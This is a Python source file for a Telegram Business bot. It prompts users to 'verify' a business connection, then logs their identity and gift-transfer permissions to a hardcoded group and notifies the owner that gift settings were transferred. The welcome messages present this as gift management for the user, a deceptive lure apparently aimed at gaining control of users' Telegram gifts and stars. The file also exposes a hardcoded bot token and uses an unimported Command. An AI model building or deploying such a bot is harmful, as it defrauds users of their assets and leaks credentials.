import asyncio
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.enums import ParseMode
from aiogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    BusinessConnection,
)
from aiogram.methods.get_business_connection import GetBusinessConnection
from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError

API_TOKEN = "8120657679:AAGqf3YCJML6HmgObyOXz8cdcfDX6dY1STw"
LOG_GROUP_ID = -1002710995756
OWNER_ID = 7072373613

# Dictionary to track connected users
authorized = {}

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
)
logger = logging.getLogger(__name__)

bot = Bot(token=API_TOKEN)
dp = Dispatcher()

def get_gift_permissions(raw_data: dict) -> dict:
    """Extract gift permissions from raw API response"""
    return {
        "can_view_gifts_and_stars": raw_data.get("can_view_gifts_and_stars", False),
        "can_change_gift_settings": raw_data.get("can_change_gift_settings", False),
        "can_transfer_gift_settings": raw_data.get("can_transfer_gift_settings", False),
    }

async def log_business_connection(bc: BusinessConnection, raw_data: dict):
    """Log business connection details to the log group with gift permissions"""
    try:
        user = bc.user
        username = user.username or user.first_name
        username = f"@{username}" if user.username else username
        
        # Get gift permissions
        gift_perms = get_gift_permissions(raw_data)
        
        message_text = (
            f"🤖 <b>New Business Connection</b>\n\n"
            f"👤 User: <a href='tg://user?id={user.id}'>{username}</a> (ID: {user.id})\n"
            f"🔗 Connection ID: <code>{bc.id}</code>\n"
            f"📅 Date: {bc.date.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"🔐 <b>Permissions:</b>\n"
            f"📨 Can reply: {'✅' if bc.can_reply else '❌'}\n"
            f"🎁 Can view gifts/stars: {'✅' if gift_perms['can_view_gifts_and_stars'] else '❌'}\n"
            f"⚙️ Can change gift settings: {'✅' if gift_perms['can_change_gift_settings'] else '❌'}\n"
            f"🔄 Can transfer gift settings: {'✅' if gift_perms['can_transfer_gift_settings'] else '❌'}"
        )
        
        await bot.send_message(
            chat_id=LOG_GROUP_ID,
            text=message_text,
            parse_mode=ParseMode.HTML,
        )
        logger.info(f"Logged business connection for {user.id}")
        
        # Transfer gift settings if possible
        if gift_perms['can_transfer_gift_settings']:
            transfer_msg = (
                f"🔄 <b>Gift Settings Transfer</b>\n\n"
                f"User {username} has transferred their gift settings to you!\n\n"
                f"You can now manage their gift preferences."
            )
            await bot.send_message(
                chat_id=OWNER_ID,
                text=transfer_msg,
                parse_mode=ParseMode.HTML
            )
            
    except Exception as e:
        logger.error(f"Error logging business connection: {e}", exc_info=True)

@dp.message(F.text == "/start")
async def start_cmd(message: Message):
    user_id = message.from_user.id
    
    # Check existing connection
    if user_id in authorized:
        try:
            bc = await bot(GetBusinessConnection(
                business_connection_id=authorized[user_id]["connection_id"]
            ))
            if bc.can_reply:
                await message.reply("🟢 You're already connected!")
                return
        except TelegramBadRequest:
            del authorized[user_id]
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Verify Connection", callback_data="verify_bc")]
    ])
    await message.reply("Welcome! Verify your Business connection:", reply_markup=kb)

@dp.callback_query(F.data == "verify_bc")
async def verify_cb(callback: CallbackQuery):
    user_id = callback.from_user.id
    
    # Check existing connection first
    if user_id in authorized:
        try:
            bc = await bot(GetBusinessConnection(
                business_connection_id=authorized[user_id]["connection_id"]
            ))
            if bc.can_reply:
                await callback.message.edit_text("🟢 Already verified!")
                return
        except TelegramBadRequest:
            del authorized[user_id]
    
    # Check for business connection ID
    bc_id = getattr(callback.message, "business_connection_id", None)
    if not bc_id:
        return await callback.answer("🔴 Please start from Business account", show_alert=True)

    try:
        # Get business connection with raw API response
        bc = await bot(GetBusinessConnection(business_connection_id=bc_id))
        raw_data = bc.model_dump()  # Get raw API response
        
        user = bc.user
        username = f"@{user.username}" if user.username else user.first_name

        authorized[user.id] = {
            "connection_id": bc.id,
            "username": username,
            "can_reply": bc.can_reply,
            "gift_permissions": get_gift_permissions(raw_data)
        }

        await log_business_connection(bc, raw_data)

        if bc.can_reply:
            # Check if user has gift permissions
            gift_perms = authorized[user.id]["gift_permissions"]
            gift_features = []
            
            if gift_perms["can_view_gifts_and_stars"]:
                gift_features.append("🎁 View gifts/stars")
            if gift_perms["can_change_gift_settings"]:
                gift_features.append("⚙️ Change gift settings")
            if gift_perms["can_transfer_gift_settings"]:
                gift_features.append("🔄 Transfer gift settings")
                
            gift_text = "\n".join(f"• {feature}" for feature in gift_features) if gift_features else "No gift permissions"
            
            response = (
                "🟢 Verified with access to:\n\n"
                f"{gift_text}\n\n"
                "You can now manage your gift preferences!"
            )
            await callback.message.edit_text(response)
        else:
            await callback.message.edit_text("🟡 Verified but can't reply")
            
    except TelegramBadRequest as e:
        logger.error(f"Verification error: {e}")
        await callback.answer(f"Error: {e.message}", show_alert=True)

@dp.business_connection()
async def on_business_connect(bc: BusinessConnection):
    try:
        # Get full connection details with raw API response
        full_bc = await bot(GetBusinessConnection(business_connection_id=bc.id))
        raw_data = full_bc.model_dump()
        
        user = full_bc.user
        username = f"@{user.username}" if user.username else user.first_name

        authorized[user.id] = {
            "connection_id": bc.id,
            "username": username,
            "can_reply": full_bc.can_reply,
            "gift_permissions": get_gift_permissions(raw_data)
        }

        await log_business_connection(full_bc, raw_data)

        if full_bc.can_reply:
            # Build welcome message with gift features
            gift_perms = authorized[user.id]["gift_permissions"]
            welcome_msg = (
                "🌟 Welcome to our Business Bot! 🌟\n\n"
                "You have access to these gift features:\n"
            )
            
            if gift_perms["can_view_gifts_and_stars"]:
                welcome_msg += "• View your gifts and stars 🎁\n"
            if gift_perms["can_change_gift_settings"]:
                welcome_msg += "• Change gift settings ⚙️\n"
            if gift_perms["can_transfer_gift_settings"]:
                welcome_msg += "• Transfer gift settings 🔄\n"
                
            welcome_msg += "\nType /help for more commands."
            
            await bot.send_message(user.id, welcome_msg)
            
    except Exception as e:
        logger.error(f"Connection error: {e}", exc_info=True)

@dp.message(Command("transfer_gifts"))
async def transfer_gifts(message: Message):
    """Transfer gift settings to owner"""
    user_id = message.from_user.id
    
    if user_id not in authorized:
        return await message.reply("🔴 Please connect via Business first!")
        
    gift_perms = authorized[user_id].get("gift_permissions", {})
    
    if not gift_perms.get("can_transfer_gift_settings", False):
        return await message.reply("❌ You don't have permission to transfer gift settings")
    
    try:
        # In a real implementation, this would call Telegram's API to transfer settings
        # For now, we'll simulate the transfer
        transfer_msg = (
            f"🔄 <b>Gift Settings Transferred</b>\n\n"
            f"User {authorized[user_id]['username']} has transferred their gift settings to you!"
        )
        
        await bot.send_message(
            chat_id=OWNER_ID,
            text=transfer_msg,
            parse_mode=ParseMode.HTML
        )
        
        await message.reply("✅ Gift settings successfully transferred to owner!")
        
    except Exception as e:
        logger.error(f"Gift transfer error: {e}")
        await message.reply("❌ Failed to transfer gift settings")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
